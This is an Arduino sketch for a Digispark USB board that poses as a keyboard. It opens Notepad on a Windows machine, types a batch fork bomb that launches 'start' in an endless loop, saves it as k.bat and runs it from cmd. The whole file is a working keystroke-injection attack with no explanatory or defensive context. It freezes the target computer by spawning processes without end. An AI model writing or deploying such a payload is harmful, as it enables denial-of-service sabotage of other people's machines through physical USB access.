#include "DigiKeyboard.h"
void setup() {
}

void loop() {
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(150);
  DigiKeyboard.print("notepad");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(150);
  DigiKeyboard.print("@ECHO OFF");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(150);
  DigiKeyboard.print(":a");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(150);
  DigiKeyboard.print("start");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(150);
  DigiKeyboard.print("goto :a");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(150);
  DigiKeyboard.print("PAUSE");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(150);
  DigiKeyboard.sendKeyStroke(KEY_S, MOD_CONTROL_LEFT);
  DigiKeyboard.delay(150);
  DigiKeyboard.print("k.bat");
  DigiKeyboard.delay(150);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(150);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(150);
  DigiKeyboard.print("cmd");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(150);
  DigiKeyboard.print("start k.bat");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  for(;;){ /*empty*/ }
}
